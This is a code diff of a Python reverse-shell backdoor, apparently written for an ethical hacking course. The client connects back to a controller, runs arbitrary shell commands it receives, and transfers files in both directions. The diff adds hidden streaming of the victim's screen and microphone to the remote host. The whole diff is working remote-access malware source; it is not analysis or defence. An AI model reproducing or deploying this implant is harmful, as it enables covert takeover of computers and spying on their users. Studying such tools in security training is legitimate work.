@@ -3,104 +3,171 @@
 # Class: SIIT Ethical Hacking, 2023-2024       #
 ################################################
 
-# Import necessary Python modules
-import socket  # For network communication
-import time  # For adding delays
-import subprocess  # For running shell commands
-import json  # For encoding and decoding data in JSON format
-import os  # For interacting with the operating system
+import socket
+import time
+import subprocess
+import json
+import os
 
-target_ip = '127.0.0.1'
-target_port = 5555
+import cv2
+import numpy as np
+import pyautogui
+import struct
+import mss
+
+import pyaudio
+import threading
+
+target_ip = '127.0.0.1' # Replace with server IP address
+target_port = 5005
+screen_port = 9999
+audio_port = 6666
 reconnection_delay = 1
 
-# Function to send data in a reliable way (encoded as JSON)
+# Constants for audio streaming
+CHUNK = 1024
+FORMAT = pyaudio.paInt16
+CHANNELS = 1
+RATE = 44100
+
 def reliable_send(data):
-    jsondata = json.dumps(data)  # Convert data to JSON format
-    s.send(jsondata.encode())  # Send the encoded data over the network
+    jsondata = json.dumps(data)
+    s.send(jsondata.encode())
 
-
-# Function to receive data in a reliable way (expects JSON data)
 def reliable_recv():
     data = ''
     while True:
         try:
-            data = data + s.recv(1024).decode().rstrip()  # Receive data in chunks and decode
-            return json.loads(data)  # Parse the received JSON data
+            data = data + s.recv(1024).decode().rstrip()
+            return json.loads(data)
         except ValueError:
             continue
 
-
-# Function to establish a connection to a remote host
 def connection():
     while True:
-        time.sleep(reconnection_delay)  # Wait before reconnecting (for resilience)
+        time.sleep(reconnection_delay)
         try:
-            # Connect to a remote host 
             s.connect((target_ip, target_port))
-            # Once connected, enter the shell() function for command execution
             shell()
-            # Close the connection when done
             s.close()
             break
         except:
-            # If a connection error occurs, retry the connection
             connection()
 
-
-# Function to upload a file to the remote host
 def upload_file(file_name):
-    f = open(file_name, 'rb')  # Open the specified file in binary read mode
-    s.send(f.read())  # Read and send the file's contents over the network
+    if not os.path.isfile(file_name):
+        error_message = f"ERROR: File '{file_name}' not found."
+        s.send(error_message.encode())
+        return
+    
+    with open(file_name, 'rb') as f:
+        s.send(f.read())
 
-
-# Function to download a file from the remote host
 def download_file(file_name):
-    f = open(file_name, 'wb')  # Open a file for binary write mode
-    s.settimeout(1)  # Set a timeout for receiving data
-    chunk = s.recv(1024)  # Receive data in chunks of 1024 bytes
+    f = open(file_name, 'wb')
+    s.settimeout(1)
+    chunk = s.recv(1024)
     while chunk:
-        f.write(chunk)  # Write the received data to the file
+        f.write(chunk)
         try:
-            chunk = s.recv(1024)  # Receive the next chunk
+            chunk = s.recv(1024)
         except socket.timeout as e:
             break
-    s.settimeout(None)  # Reset the timeout setting
-    f.close()  # Close the file when done
+    s.settimeout(None)
+    f.close()
 
+def screen_stream(screen_socket):
+    w, h = pyautogui.size()
+    monitor = {"top": 0, "left": 0, "width": w, "height": h}
 
-# Main shell function for command execution
+    try:
+        with mss.mss() as sct:
+            while True:
+                screen = sct.grab(monitor)
+                frame = np.array(screen)
+                _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 80])
+                message = struct.pack(">L", len(buffer)) + buffer.tobytes()
+                try:
+                    screen_socket.sendall(message)
+                except BrokenPipeError:
+                    print("Broken pipe error, connection lost.")
+                    break
+    except KeyboardInterrupt:
+        print("Stopped by user.")
+    finally:
+        screen_socket.close()
+
+def audio_stream(audio_socket):
+    p = pyaudio.PyAudio()
+    stream = p.open(format=FORMAT,
+                    channels=CHANNELS,
+                    rate=RATE,
+                    input=True,
+                    frames_per_buffer=CHUNK)
+    
+    try:
+        while True:
+            data = stream.read(CHUNK, exception_on_overflow=False)
+            audio_socket.sendall(data)
+    except KeyboardInterrupt:
+        print("Stopped by user.")
+    finally:
+        stream.stop_stream()
+        stream.close()
+        p.terminate()
+        audio_socket.close()
+
 def shell():
+    global screen_socket, audio_socket
+
     while True:
-        # Receive a command from the remote host
         command = reliable_recv()
+
+        # Common command
         if command == 'quit':
-            # If the command is 'quit', exit the shell loop
             break
         elif command == 'clear':
-            # If the command is 'clear', do nothing (used for clearing the screen)
             pass
         elif command[:3] == 'cd ':
-            # If the command starts with 'cd ', change the current directory
-            os.chdir(command[3:])
-            reliable_send(os.getcwd())
+            dir_change = command[3:]
+            try:
+                os.chdir(dir_change)
+                reliable_send({'stdout': os.getcwd(), 'stderr': ''})
+            except FileNotFoundError as e:
+                reliable_send({'stdout': '', 'stderr': f'cd: no such file or directory: {dir_change}\n'})
         elif command[:8] == 'download':
-            # If the command starts with 'download', upload a file to the remote host
             upload_file(command[9:])
         elif command[:6] == 'upload':
-            # If the command starts with 'upload', download a file from the remote host
             download_file(command[7:])
+
+        # Screen Streaming
+        elif command == 'screen':
+            screen_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            screen_socket.connect((target_ip, screen_port))
+            screen_thread = threading.Thread(target=screen_stream, args=(screen_socket,))
+            screen_thread.start()
+        elif command == 'audio':
+            audio_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            audio_socket.connect((target_ip, audio_port))
+            audio_thread = threading.Thread(target=audio_stream, args=(audio_socket,))
+            audio_thread.start()
+        elif command == 'screenstream':
+            screen_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            screen_socket.connect((target_ip, screen_port))
+            audio_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            audio_socket.connect((target_ip, audio_port))
+            screen_thread = threading.Thread(target=screen_stream, args=(screen_socket,))
+            audio_thread = threading.Thread(target=audio_stream, args=(audio_socket,))
+            screen_thread.start()
+            audio_thread.start()
+
+        # Others
         else:
-            # For other commands, execute them using subprocess
             execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-            result = execute.stdout.read() + execute.stderr.read()  # Capture the command's output
-            result = result.decode()  # Decode the output to a string
-            # Send the command execution result back to the remote host
+            result = execute.stdout.read() + execute.stderr.read()
+            result = result.decode()
             reliable_send(result)
 
-
-# Create a socket object for communication over IPv4 and TCP
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-# Start the connection process by calling the connection() function
 connection()
